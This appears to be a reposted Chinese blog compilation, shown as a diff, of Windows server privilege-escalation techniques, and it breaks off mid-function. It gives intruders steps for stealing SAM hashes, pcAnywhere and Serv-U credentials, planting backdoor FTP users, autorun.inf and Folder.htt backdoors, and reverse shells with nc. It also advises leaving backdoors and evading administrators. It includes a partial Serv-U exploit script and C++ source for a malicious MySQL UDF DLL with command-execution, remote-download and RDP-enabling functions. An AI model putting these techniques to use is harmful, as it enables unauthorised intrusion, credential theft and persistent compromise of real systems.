@@ -1,0 +1,494 @@
+总结了各种提权经验文章作者：新浪博客 | 更新日期：2010-11-20 0:00:00 | 浏览(6)人次 | 好评(0)人次 | 差评(0)人次
+-
+总结了各种提权经验
+-
+总结了各种提权经验看称经典中的经典。希望对朋友有帮助！
+东西不是很新!!只是总结了下!补充了下!!给大家提权作为参考!!
+
+c: d: e:.....
+C:\Documents and Settings\All Users\「开始」菜单\程序\
+看这里能不能跳转，我们从这里可以获取好多有用的信息比如Serv-U的路径，
+C:\Documents and Settings\All Users\ApplicationData\Symantec\pcAnywhere\
+看能否跳转到这个目录，如果行那就最好了，直接下它的CIF文件，破解得到pcAnywhere密码，登陆
+c:\Program Files\serv-u\
+C:\WINNT\system32\config\
+下它的SAM，破解密码
+c:\winnt\system32\inetsrv\data\
+是erveryone 完全控制，很多时候没作限制，把提升权限的工具上传上去，然后执行
+c:\prel
+C:\Program Files\Java Web Start\
+c:\Documents and Settings\
+C:\Documents and Settings\All Users\
+c:\winnt\system32\inetsrv\data\
+c:\Program Files\
+c:\Program Files\serv-u\
+C:\Program Files\Microsoft SQL Server\
+c:\Temp\
+c:\mysql\(如果服务器支持PHP）
+c:\PHP(如果服务器支持PHP）
+运行"cscript C:\Inetpub\AdminScripts\adsutil.vbs getw3svc/inprocessisapiapps"来提升权限
+还可以用这段代码试提升，好象不是很理想的
+如果主机设置很变态，可以试下在c:\Documents and Settings\AllUsers\「开始」菜单\程序\启动"写入bat，vbs等木马。
+根目录下隐藏autorun.inf
+C:\PROGRAM FILES\KV2004\ 绑
+D:\PROGRAM FILES\RISING\RAV\
+C:\Program Files\Real\RealServer\
+rar
+Folder.htt与desktop.ini
+将改写的Folder.htt与desktop.ini，还有你的木马或者是VBS或者是什么，放到对方管理员最可能浏览的目录下
+replace 替换法 捆绑
+脚本 编写一个启动/关机脚本 重起
+删SAM :( 错
+CAcls命令
+FlashFXP文件夹Sites.dat Sites.dat.bak Stats.dat Stats.dat.bak
+
+Ring的权限提升21大法！
+1.radmin连接法
+
+条件是你权限够大，对方连防火墙也没有。封装个radmin上去，运行，开对方端口，然后radmin上去
+
+。本人从来米成功过。，端口到是给对方打开了。
+
+2.paanywhere
+
+C:\Documents and Settings\All Users\ApplicationData\Symantec\pcAnywhere\ 这里下他的GIF
+
+文件，在本地安装pcanywhere上去
+
+3.SAM破解
+
+C:\WINNT\system32\config\ 下他的SAM 破解之
+
+4.SU密码夺取
+
+C:\Documents and Settings\All Users\「开始」菜单\程序\
+
+引用：Serv-U，然后本地查看属性，知道路径后，看能否跳转
+进去后，如果有权限修改ServUDaemon.ini，加个用户上去，密码为空
+[USER=WekweN|1]
+Password=
+HomeDir=c:\
+TimeOut=600
+Maintenance=System
+Access1=C:\|RWAMELCDP
+Access1=d:\|RWAMELCDP
+Access1=f:\|RWAMELCDP
+SKEYValues=
+这个用户具有最高权限，然后我们就可以ftp上去 quote site exec xxx 来提升权限
+
+5.c:\winnt\system32\inetsrv\data\
+
+引用：就是这个目录，同样是erveryone 完全控制，我们所要做的就是把提升权限的工具上传上去，
+
+然后执行
+
+6.SU溢出提权
+
+这个网上教程N多 不详细讲解了
+
+7.运行Csript
+
+引用：运行"cscript C:\Inetpub\AdminScripts\adsutil.vbs getw3svc/inprocessisapiapps"来提
+
+升权限
+用这个cscript C:\Inetpub\AdminScripts\adsutil.vbs getw3svc/inprocessisapiapps
+查看有特权的dll文件：idq.dll httpext.dll httpodbc.dll ssinc.dllmsw3prt.dll
+再将asp.dll加入特权一族
+asp.dll是放在c:\winnt\system32\inetsrv\asp.dll (不同的机子放的位置不一定一样)
+我们现在加进去cscript adsutil.vbs set /W3SVC/InProcessIsapiApps"C:\WINNT\system32\idq.dll"
+
+"C:\WINNT\system32\inetsrv\httpext.dll""C:\WINNT\system32\inetsrv\httpodbc.dll"
+
+"C:\WINNT\system32\inetsrv\ssinc.dll""C:\WINNT\system32\msw3prt.dll""c:\winnt\system32
+
+\inetsrv\asp.dll"
+可以用cscript adsutil.vbs get /W3SVC/InProcessIsapiApps 来查看是不是加进去了
+
+8.脚本提权
+
+c:\Documents and Settings\All Users\「开始」菜单\程序\启动"写入bat，vbs
+
+9.VNC
+
+这个是小花的文章 HOHO
+
+默认情况下VNC密码存放在HKCU\Software\ORL\WinVNC3\Password
+
+我们可以用vncx4
+
+破解它，vncx4使用很简单，只要在命令行下输入
+
+c:\>vncx4 -W
+
+然后顺序输入上面的每一个十六进制数据，没输完一个回车一次就行了。
+
+10.NC提权
+
+给对方来个NC 但是条件是你要有足够的运行权限 然后把它反弹到自己的电脑上 HOHO OK了
+
+11.社会工程学之GUEST提权
+很简单 查看他的拥护 一般来说 看到帐户以后 密码尽量猜 可能用户密码一样 也可能是他QQ号 邮
+
+箱号 手机号 尽量看看 HOHO
+
+12.IPC空连接
+
+如果对方真比较白痴的话 扫他的IPC 如果运气好还是弱口令
+
+13.替换服务
+
+这个不用说了吧？个人感觉相当复杂
+
+14.autorun .inf
+
+autorun=xxx.exe 这个=后面自己写 HOHO 加上只读、系统、隐藏属性 传到哪个盘都可以的 不相信
+
+他不运行
+
+15.desktop.ini与Folder.htt
+
+引用：首先，我们现在本地建立一个文件夹，名字不重要，进入它，在空白处点右键，选择“自定义
+
+文件夹”（xp好像是不行的）一直下点，默认即可。完成后，你就会看到在此目录下多了两个名为Folder
+
+setting的文件架与desktop.ini的文件，（如果你看不到，先取消“隐藏受保护的操作系统文件”）然后
+
+我们在Folder setting目录下找到Folder.htt文件，记事本打开，在任意地方加入以下代码：<OBJECT
+
+ID=”RUNIT” WIDTH=0 HEIGHT=0 TYPE=”application/x-oleobject”CODEBASE=”你的后门文件名”>
+
+</OBJECT> 然后你将你的后门文件放在Foldersetting目录下，把此目录与desktop.ini一起上传到对方
+
+任意一个目录下，就可以了，只要等管理员浏览了此目录，它就执行了我们的后门
+
+16.su覆盖提权
+
+本地安装个su，将你自己的ServUDaemon.ini文件用从他那下载下来的ServUDaemon.ini 覆盖掉，重
+
+起一下Serv-U，于是你上面的所有配置都与他的一模一样了
+
+17.SU转发端口
+
+43958这个是 Serv －U 的本地管理端口。FPIPE.exe上传他，执行命令： Fpipe –v –l 3333–r
+
+43958 127.0.0.1 意思是将4444端口映射到43958端口上。然后就可以在本地安装一个Serv-u，新建一个
+
+服务器，IP填对方IP，帐号为LocalAdministrator 密码为#1@$ak#.1k;0@p 连接上后你就可以管理他的
+
+Serv-u了
+
+18.SQL帐户密码泄露
+
+如果对方开了MSSQL服务器，我们就可以通过用SQL连接器加管理员帐号（可以从他的连接数据库的
+
+ASP文件中看到），因为MSSQL是默认的SYSTEM权限。
+
+引用：对方没有删除xp_cmdshell 方法：使用Sqlexec.exe，在host一栏中填入对方IP，User与Pass
+
+中填入你所得到的用户名与密码。format选择xp_cmdshell”%s”即可。然后点击connect，连接上后就可
+
+以在CMD一栏中输入你想要的CMD命令了
+
+19.asp.dll
+
+引用：因为asp.dll是放在c:\winnt\system32\inetsrv\asp.dll  (不同的机子放的位置不一定相同
+
+)
+我们现在加进去cscript adsutil.vbs set /W3SVC/InProcessIsapiApps"C:\WINNT\system32\idq.dll"
+
+"C:\WINNT\system32\inetsrv\httpext.dll""C:\WINNT\system32\inetsrv\httpodbc.dll"
+
+"C:\WINNT\system32\inetsrv\ssinc.dll""C:\WINNT\system32\msw3prt.dll""c:\winnt\system32
+
+\inetsrv\asp.dll"
+好了,现在你可以用cscript adsutil.vbs get /W3SVC/InProcessIsapiApps来查看是不是加进去
+
+PcAnywhere12提权方法
+
+在早期的入侵提权中，我们经常可以看到使用利用安装PcAnywhere的服务器下载cif文件，然后使用明小子或者其他专用的密码读取工具进行读取控制密码的提权方法。这个应该算是PcAnywhere的一个硬伤了。而通常这个文件存在的目录是“C:\Documentsand Settings\All Users\ApplicationData\Symantec\pcAnywhere”guest权限对该目录是具有访问权限的。所以就可以下载cif配置文件进行读取，然后本地连接进行提权。
+但是这一方法在最新的12.1版本中，已经不可以了。我们再去下载该cif文件，用密码读取工具是读不到密码的，即使可以读得到，也是乱码。但是通过浏览安装目录，我们可以发现。在PcAnywhere的“C:\Documentsand Settings\All Users\ApplicationData\Symantec\pcAnywhere”路径下，会有一个名称为“Hosts”的文件夹。在这个里面同样存储了一个cif文件。我们就是通过本地配置一个可控的服务端，然后在本地生成这样一个cif文件，然后将他覆盖保存于网站服务器的目录下，就可以使用本地的密码进行连接了。可喜的是，默认安装状态下，Windows2003中这个目录是Everyone具有完全控制权限的！这就为我们的提全铺平了最后一条路！
+最后一点需要提到的就是，大家在入侵提权前，一定要下载保存原网站的cif文件。然后在上传覆盖本地的，入侵成功后留下后门在替换回来，以免被管理员发现。
+
+SERV-U 6.4提权方法,通杀SERV-U版本
+修改ftpport为21
+
+修改newdomain后面的goldsun| IP(为要提权的服务器的IP地址)|
+
+修改newuser后面的-IP=IP地址和上面一样(为要提权的服务器的IP地址)...OK.....提权...会用FTP增加一个可以
+
+执行命令的用户.....有个这个用户什么不能做哈.....
+ftpport = 65500
+timeout=3
+loginuser = "User " & user &vbCrLf
+loginpass = "Pass " & pass &vbCrLf
+deldomain = "-DeleteDOMAIN" & vbCrLf& "-IP=0.0.0.0" & vbCrLf& " PortNo=" & ftpport& vbCrLf
+mt = "SITE MAINTENANCE" & vbCrLf
+newdomain = "-SETDOMAIN" & vbCrLf &"-Domain=goldsun|0.0.0.0|" & ftpport& "|-1|1|0" & vbCrLf& "-TZOEnable=0" & vbCrLf& " TZOKey=" & vbCrLf
+newuser = "-SETUSERSETUP" & vbCrLf& "-IP=0.0.0.0" & vbCrLf& "-PortNo=" & ftpport& vbCrLf & "-User=go"& vbCrLf & "-Password=od"& vbCrLf & _
+
+Mysql提权方法利用
+
+-
+-
+mysql是一个常用的数据库系统,应用极广泛,如果得到一个mysql的用户权限,如果提升呢,下面这个思路很先进!但得有一定编程基础!
+
+　　现在网上通过mysql获得系统权限大都通过MYSQL的用户函数接口UDF，比如Mix.dll和my_udf.dll。在Mix.dll中有一个MixConnect函数它会反弹shell，但是使用这个函数会造成MYSQL假死，前些天我就用这个函数反弹shell后由于网络原因不一会儿就断开了，造成了MYSQL当掉。my_udf.dll和Mix.dll相似，但它是通过my_udfdoor函数在服务器上侦听3306端口，用nc正向连接获得shell，但它的功能显的少了点，于是我决定自己写一个功能强大，运行稳定的UDF。
+MYSQL有一个开发包，它定义了自己的接口，变量类型，以及函数执行顺序。比如我们要写一个open3389函数，我们可以这样写：
+程序代码
+extern "C" __declspec(dllexport)my_bool open3389_init(UDF_INIT*initid, UDF_ARGS *args, char *message)
+{
+//在open3389函数之前调用，一般用于初始化工作，为可选函数；
+//return 1出错 ,0 正常
+　return 0;
+}
+extern "C" __declspec(dllexport)char *open3389(UDF_INIT *initid,UDF_ARGS *args,char *result, unsigned long *length,char *is_null,char *error)
+{
+//真正实现功能的函数，必需函数；
+
+}
+extern "C" __declspec(dllexport)void open3389_deinit(UDF_INIT*initid)
+{
+//在open3389函数之后调用，一般用于内存释放，可选函数；
+}
+　 以上的open3389函数的返回值是char*类型的，如果是其它类型函数的参数列表也会有所不同，具体的可见MYSQL参考手册。
+在写MYSQLUDF时另一个必须考虑的问题是程序的稳定时，它要经的起各种变态输入的考验，否则一旦程序出错MYSQL服务进程就会当掉。
+以下是我写的UDF内容，它包含10个函数：
+cmdshell 执行cmd；
+downloader 下载者,到网上下载指定文件并保存到指定目录；
+open3389 通用开3389终端服务，可指定端口(不改端口无需重启)；
+backshell 反弹Shell；
+ProcessView 枚举系统进程；
+KillProcess 终止指定进程；
+regread 读注册表；
+regwrite 写注册表；
+shut 关机，注销，重启；
+about 说明与帮助函数；
+使用方法:
+创建函数：create function 函数名(区分大小写) returns string soname 'dll名'(注意路径)；
+删除函数：delete function 函数名；
+使用函数：select 函数名(参数列表)；获取参数信息可使用select 函数名("help")；
+以上几个函数都经过多次的测试（测试平台：MYSQL 5.0.24-community-nt、WindowsXP），不太可能会造成MYSQL假死等现象，但也不排除在特殊环境，特殊输入的情况下出错的可能，如发现bug可通知我，QQ：185826531（langouster）
+程序代码
+//--------------------------------------------------------------------------源程序
+// MYSQL_UDF.cpp : 定义 DLL 应用程序的入口点。
+#include "stdafx.h"
+#include "stdio.h"
+#include <windows.h>
+#include <tlhelp32.h>
+#include <stdlib.h>
+#include <winsock.h>
+#include <Urlmon.h>
+#include "mysql.h"
+#include "resource.h"
+#pragma comment(lib, "Urlmon.lib")
+HANDLE g_module;
+//--------------------------------------------------------------------------------------------------------------------------
+BOOL APIENTRY DllMain(HINSTANCE hModule,DWORDul_reason_for_call,LPVOID lpReserved)
+{
+if(ul_reason_for_call==DLL_PROCESS_ATTACH)
+　　　g_module=hModule;
+return TRUE;
+}
+//--------------------------------------------------------------------------------------------------------------------------cmdshell
+extern "C" __declspec(dllexport)my_bool cmdshell_init(UDF_INIT*initid, UDF_ARGS *args, char *message)
+{//return 1出错 ,0 正常
+　initid->max_length=65*1024*1024;
+　return 0;
+}
+extern "C" __declspec(dllexport)char *cmdshell(UDF_INIT *initid,UDF_ARGS *args,char *result, unsigned long *length,char *is_null,char *error)
+{
+　if(args->arg_count!=1 ||args->arg_type[0]!=STRING_RESULT ||stricmp(args->args[0],"help")==0)
+　{
+　　　initid->ptr=(char *)malloc(200);
+　　　if(initid->ptr==NULL)return NULL;
+　　　strcpy(initid->ptr,"执行CMD Shell函数.\r\n例:selectcmdshell(\"dirc:\\\\\");\r\n参数中的\"\\\"要用\"\\\\\"代替.");
+　　　*length=strlen(initid->ptr);
+　　　return initid->ptr;
+　}
+　int RunStatus=0;
+　char*cmdline,TempFilePath[MAX_PATH],ShellPath[MAX_PATH],temp[100];
+　DWORD size=0,len;
+　HANDLE hFile;
+　
+　GetSystemDirectory(ShellPath,MAX_PATH-1);
+　strcat(ShellPath,"\\cmd.exe");
+　GetEnvironmentVariable("temp",TempFilePath,MAX_PATH-1);
+　strcat(TempFilePath,"\\2351213.tmp");
+　cmdline=(char*)malloc(strlen(args->args[0])+strlen(TempFilePath)+7);
+　strcpy(cmdline," /c ");
+　strcat(cmdline,(args->args)[0]);
+　strcat(cmdline,">");
+　strcat(cmdline,TempFilePath);
+　STARTUPINFO si;
+　PROCESS_INFORMATION pi;
+　ZeroMemory( &si, sizeof(si) );
+　si.wShowWindow=SW_HIDE;
+　si.cb = sizeof(si);
+　ZeroMemory( &pi, sizeof(pi) );
+　RunStatus=CreateProcess(ShellPath,cmdline,NULL,NULL,FALSE,0,0,0,&si,&pi);
+　free(cmdline);
+　if(!RunStatus)
+　{
+　　　itoa(GetLastError(),temp,10);
+　　　sprintf(temp,"Shell无法启动,GetLastError=%s\n",temp);
+　　　initid->ptr=(char *)malloc(strlen(temp)+1);
+　　　strcpy(initid->ptr,temp);
+　　　(*length)=strlen(initid->ptr);
+　　　return initid->ptr;
+　}
+　WaitForSingleObject(pi.hProcess,30000);
+　//获得结果
+　hFile=CreateFile(TempFilePath,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,NULL);
+　if(hFile!=INVALID_HANDLE_VALUE)
+　{
+　　　size=GetFileSize(hFile,NULL);
+　　　initid->ptr=(char *)malloc(size+100);
+　　　ReadFile(hFile,initid->ptr,size+1,&len,NULL);
+　　　(initid->ptr)[size]='\0';
+　　　strcat(initid->ptr,"\r\n--------------------------------------------完成!\r\n");
+　　　CloseHandle(hFile);
+　　　DeleteFile(TempFilePath);
+　}
+　else
+　{
+　　　initid->ptr=(char *)malloc(100);
+　　　strcpy(initid->ptr,"\r\n--------------------------------------------完成!\r\n");
+　}
+　(*length)=strlen(initid->ptr);
+　return initid->ptr;
+}
+extern "C" __declspec(dllexport)void cmdshell_deinit(UDF_INIT*initid)
+{
+　if(initid->ptr!=NULL)
+　　　free(initid->ptr);
+}
+//---------------------------------------------------------------------------------------------------------------------------downloader
+extern "C" __declspec(dllexport)my_bool downloader_init(UDF_INIT*initid, UDF_ARGS *args, char *message)
+{//return 1出错 ,0 正常
+　initid->max_length=65*1024*1024;
+　return 0;
+}
+extern "C" __declspec(dllexport)char *downloader(UDF_INIT *initid,UDF_ARGS *args,char *result, unsigned long *length,char *is_null,char *error)
+{
+　if(args->arg_count!=2 ||args->arg_type[0]!=STRING_RESULT ||args->arg_type[1]!=STRING_RESULT ||stricmp(args->args[0],"help")==0)
+　{
+　　　initid->ptr=(char *)malloc(200);
+　　　if(initid->ptr==NULL)return NULL;
+　　　strcpy(initid->ptr,"下载者函数\r\n例:selectdownloader(\"http://www.baidu.com/server.exe\",\"c:\\\\winnt\\\\system32\\\\ser.exe\");\r\n参数中的\"\\\"要用\"\\\\\"代替.");
+　　　*length=strlen(initid->ptr);
+　　　return initid->ptr;
+　}
+　HANDLE hFile;
+　char path[MAX_PATH];
+
+　strcpy(path,(args->args)[1]);
+　
+　hFile=CreateFile(path,GENERIC_WRITE,FILE_SHARE_READ,NULL,Create_ALWAYS,0,NULL);
+　if(hFile==INVALID_HANDLE_VALUE)
+　{
+　　　initid->ptr=(char*)malloc(100+strlen(path));
+　　　sprintf(initid->ptr,"文件创建失败,请确认目录存在且有写权限(%s).",path);
+　　　*length=strlen(initid->ptr);
+　　　return initid->ptr;
+　}
+　CloseHandle(hFile);
+　DeleteFile(path);
+　
+　if(URLDownloadToFile(NULL,(args->args)[0],path,0,0)==S_OK)
+　{
+　　　initid->ptr=(char*)malloc(50+strlen(path));
+　　　sprintf(initid->ptr,"下载文件成功(%s).",path);
+　　　*length=strlen(initid->ptr);
+　　　return initid->ptr;
+　}
+　else
+　{
+　　　initid->ptr=(char*)malloc(100+strlen((args->args)[0]));
+　　　sprintf(initid->ptr,"下载文件出现错误,可能是网络原因(%s).",(args->args)[0]);
+　　　*length=strlen(initid->ptr);
+　　　return initid->ptr;
+　}
+}
+extern "C" __declspec(dllexport)void downloader_deinit(UDF_INIT*initid)
+{
+　if(initid->ptr)
+　　　free(initid->ptr);
+}
+//--------------------------------------------------------------------------------------------------------------------------open3389
+extern "C" __declspec(dllexport)my_bool open3389_init(UDF_INIT*initid, UDF_ARGS *args, char *message)
+{//return 1出错 ,0 正常
+　initid->max_length=65*1024*1024;
+　return 0;
+}
+extern "C" __declspec(dllexport)char *open3389(UDF_INIT *initid,UDF_ARGS *args,char *result, unsigned long *length,char *is_null,char *error)
+{
+　if(!(args->arg_count==0||(args->arg_count==1&&args->arg_type[0]==INT_RESULT)))
+　{
+　　　initid->ptr=(char *)malloc(200);
+　　　if(initid->ptr==NULL)return NULL;
+　　　strcpy(initid->ptr,"通用开3389终端服务.修改端口需重启后生效.\r\n例:selectopen3389([端口]);");
+　　　*length=strlen(initid->ptr);
+　　　return initid->ptr;
+　}
+　HRSRC hrsrc1;
+　HGLOBAL hglobal1;
+　HANDLE hFile;
+　char path[MAX_PATH];
+　DWORD size,size2;
+　GetEnvironmentVariable("temp",path,MAX_PATH-1);
+　strcat(path,"\\457391.exe");
+　hrsrc1=FindResource((HMODULE)g_module, MAKEINTRESOURCE(IDR_BIN1),"BIN");
+　if(hrsrc1==NULL)
+　{
+　　　initid->ptr=(char *)malloc(100);
+　　　strcpy(initid->ptr,"查找资源出错,open3389无法继续运行.");
+　　　*length=strlen(initid->ptr);
+　　　return initid->ptr;
+　}
+　size=SizeofResource((HMODULE)g_module, hrsrc1);
+　hglobal1=LoadResource((HMODULE)g_module, hrsrc1);
+　if(hglobal1==NULL)
+　{
+　　　initid->ptr=(char *)malloc(100);
+　　　strcpy(initid->ptr,"载入资源出错,open3389无法继续运行.");
+　　　*length=strlen(initid->ptr);
+　　　return initid->ptr;
+　}
+
+　hFile = CreateFile(path,GENERIC_WRITE,0,NULL,Create_ALWAYS,0,NULL);
+　if(hFile==INVALID_HANDLE_VALUE)
+　{
+　　　initid->ptr=(char *)malloc(100);
+　　　strcpy(initid->ptr,"创建临时文件出错,open3389无法继续运行.");
+　　　*length=strlen(initid->ptr);
+　　　return initid->ptr;
+　}
+　WriteFile(hFile,(LPVOID)LockResource(hglobal1),size+1,&size2,NULL);
+　CloseHandle(hFile);
+　GlobalFree(hglobal1);
+
+　STARTUPINFO si;
+　PROCESS_INFORMATION pi;
+　ZeroMemory( &si, sizeof(si) );
+　si.wShowWindow=SW_HIDE;
+　si.cb = sizeof(si);
+　ZeroMemory( &pi, sizeof(pi) );
+　boolRunStatus=CreateProcess(path,NULL,NULL,NULL,FALSE,0,0,0,&si,&pi);
+　if(!RunStatus)
+　{
+　　　DeleteFile(path);
+　　　initid->ptr=(char *)malloc(100);
+　　　strcpy(initid->ptr,"运行临时文件出错,您的权限可能不够.");
+　　　*length=strlen(initid->ptr);
+　　　return initid->ptr;
+　}
+　WaitForSingleObject(pi.hProcess,5000);
+　DeleteFile(path);
+　//改端口
+　if(args->arg_count!=0&&args->arg_type[0]==INT_RESULT)
+　{
+　　　HKEY key;
+　　　DWORD dwDisposition;
+　　　DWORD port=*((long long *)args->args[0]);
+
+
